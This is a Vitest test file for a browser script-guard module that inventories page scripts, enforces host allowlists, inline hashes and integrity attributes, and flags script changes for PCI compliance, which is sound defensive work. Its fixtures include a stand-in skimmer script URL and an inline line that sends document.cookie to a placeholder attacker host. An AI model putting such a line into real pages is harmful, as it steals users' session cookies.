import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest'
import { scriptGuard } from '../../modules/scriptGuard'
import { events } from '../../core/events'
import { stackInspector } from '../../core/callsite'

describe('scriptGuard', () => {
  beforeEach(() => {
    document.head.innerHTML = ''
    document.body.innerHTML = ''
    localStorage.clear()
    events.reset()
  })
  afterEach(() => {
    scriptGuard._reset()
    vi.restoreAllMocks()
  })

  it('inventories scripts present at load', () => {
    document.head.innerHTML = '<script src="https://cdn.ok.com/a.js" integrity="sha384-x"></script><script>var a=1</script><script type="application/ld+json">{}</script>'
    scriptGuard.enable({ allow: ['cdn.ok.com'] })
    const inv = scriptGuard.getInventory()
    expect(inv).toHaveLength(2) // JSON-LD is not code
    expect(inv[0]).toMatchObject({ kind: 'external', authorized: true, integrity: 'sha384-x' })
    expect(inv[1]).toMatchObject({ kind: 'inline', authorized: true, reason: 'present at page load' })
    expect(inv[1].hash).toBe(scriptGuard.hashInline('var a=1'))
  })

  it('reports unauthorized third-party scripts', () => {
    const seen = vi.fn()
    events.on('script_unauthorized', seen)
    document.head.innerHTML = '<script src="https://evil.example/skim.js"></script>'
    scriptGuard.enable({ allow: ['cdn.ok.com'] })
    expect(seen).toHaveBeenCalledTimes(1)
    expect(seen.mock.calls[0][0].details.reason).toBe('host not in allowlist')
  })

  it('neutralizes unauthorized dynamic scripts before execution in enforce mode', () => {
    vi.spyOn(stackInspector, 'current').mockReturnValue(['https://compromised-vendor.com/tag.js'])
    const blocked = vi.fn()
    events.on('script_blocked', blocked)
    scriptGuard.enable({ mode: 'enforce', allow: ['cdn.ok.com'] })

    const bad = document.createElement('script')
    bad.src = 'https://evil.example/skim.js'
    document.body.appendChild(bad)
    expect(bad.getAttribute('type')).toBe('text/hyde-blocked')
    expect(blocked.mock.calls[0][0].details.insertedBy).toEqual(['https://compromised-vendor.com/tag.js'])

    const good = document.createElement('script')
    good.src = 'https://cdn.ok.com/lib.js'
    document.body.append(good)
    expect(good.getAttribute('type')).toBeNull()
  })

  it('checks dynamic inline scripts by hash', () => {
    const okCode = 'console.log("ok")'
    scriptGuard.enable({ mode: 'enforce', allowInlineHashes: [scriptGuard.hashInline(okCode)] })
    const ok = document.createElement('script')
    ok.textContent = okCode
    document.body.appendChild(ok)
    const bad = document.createElement('script')
    bad.textContent = 'fetch("https://evil/?c="+document.cookie)'
    document.body.appendChild(bad)
    expect(ok.getAttribute('type')).toBeNull()
    expect(bad.getAttribute('type')).toBe('text/hyde-blocked')
  })

  it('requireIntegrity flags allowlisted scripts without SRI', () => {
    document.head.innerHTML = '<script src="https://cdn.ok.com/a.js"></script>'
    scriptGuard.enable({ allow: ['cdn.ok.com'], requireIntegrity: true })
    expect(scriptGuard.getInventory()[0]).toMatchObject({ authorized: false, reason: 'third-party script without integrity attribute' })
  })

  it('detects inventory changes between visits (PCI 11.6.1)', () => {
    const changed = vi.fn()
    events.on('script_inventory_changed', changed)
    document.head.innerHTML = '<script src="https://cdn.ok.com/a.js"></script>'
    scriptGuard.enable({ allow: ['cdn.ok.com'] })
    scriptGuard._reset()
    document.head.innerHTML = '<script src="https://cdn.ok.com/a.js"></script><script src="https://cdn.ok.com/new.js"></script>'
    scriptGuard.enable({ allow: ['cdn.ok.com'] })
    expect(changed).toHaveBeenCalledTimes(1)
    expect(changed.mock.calls[0][0].details.added).toEqual(['https://cdn.ok.com/new.js'])
  })

  it('exports an audit report and supports runtime authorization', () => {
    scriptGuard.enable({ mode: 'enforce' })
    scriptGuard.authorize('consent.example')
    const s = document.createElement('script')
    s.src = 'https://consent.example/banner.js'
    document.body.appendChild(s)
    expect(s.getAttribute('type')).toBeNull()
    const report = JSON.parse(scriptGuard.exportReport())
    expect(report.summary.total).toBe(1)
    expect(report.allowlist).toContain('consent.example')
  })

  it('disable restores DOM methods', () => {
    const orig = Node.prototype.appendChild
    scriptGuard.enable()
    expect(Node.prototype.appendChild).not.toBe(orig)
    scriptGuard.disable()
    expect(Node.prototype.appendChild).toBe(orig)
  })
})
